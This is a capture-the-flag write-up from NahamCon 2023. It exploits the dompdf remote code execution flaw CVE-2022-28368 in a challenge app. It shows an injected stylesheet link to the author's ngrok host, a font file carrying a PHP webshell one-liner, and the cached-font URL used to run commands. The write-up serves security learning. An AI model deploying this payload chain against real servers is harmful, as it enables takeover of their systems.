Visiting the website, there is a form to fill out custom information. Upon submitting data, we are generated a pdf webpage:

![Pasted image 20230616151436.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616151436.png)

In particular I notice the url of the page corresponds to the data I submitted:

```
http://challenge.nahamcon.com:31182/quote.php?organisation=&email=&small=0&medium=0&large=0
```

I downloaded the pdf file and decided to see if I can glean some information on how it was generated:

```

```

Immediately the producer `dompdf` stands out to me. I recognize a pretty serious vulnerability it that can lead to remote code execution [CVE-2022-28368](https://nvd.nist.gov/vuln/detail/CVE-2022-28368). 

I used [this poc post](https://github.com/positive-security/dompdf-rce) to exploit this.

Using my own `ngrok` website, I direct the payload toward myself, where it can pick up the malicious php:

```
challenge.nahamcon.com:31182/quote.php?organisation=<link rel=stylesheet href='https://91cf-50-81-86-237.ngrok-free.app/exploit.css'>&email=&small=0&medium=0&large=0
```

In the exploit_font.php, I used a simple webshell one-liner:

```shell
$ cat exploit_font.php 

ï¿½ dum1ï¿½cmap
           `ï¿½,glyf5scï¿½ï¿½headï¿½Q6ï¿½6hheaï¿½ï¿½($hmtxD
loca
Tmaxp\ nameDï¿½|8dum2ï¿½
                     -ï¿½ï¿½-ï¿½ï¿½ï¿½ï¿½
:83#5:08ï¿½ï¿½_<ï¿½
             @ï¿½8ï¿½&Û½
:8Lï¿½ï¿½

:D

6                               s
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

The unreadable junk above seems to be related to the file being intended as a font style, so it was left unchanged. 

After the request is sent, I see two GET requests on my server, knowing that it was successfully retrieved:

```
HTTP Requests                                                                                                       
-------------                                                                                                       
                                                                                                                    
GET /exploit_font.php          200 OK                                                                               
GET /exploit.css               200 OK 
```

Now we need to determine the new name of the malicious php downloaded. While not thoroughly explained in the POC github, it appears that the name is based on the `md5sum` of the download link, in this case my ngrok link:

```
$ echo -ne "https://91cf-50-81-86-237.ngrok-free.app/exploit_font.php" | md5sum
88045a0e7631a2540434bb8c27d7d483  -

```


Now we visit the downloaded link under the format `/dompdf/lib/fonts/<font-family>_<style>_<md5(url)>.php`

```
challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=id
```

```

We do indeed see that it works! We were told the flag is located in root of the filesystem:

```

```


`flag{a4d52beabcfdeb6ba79fc08709bb5508}`
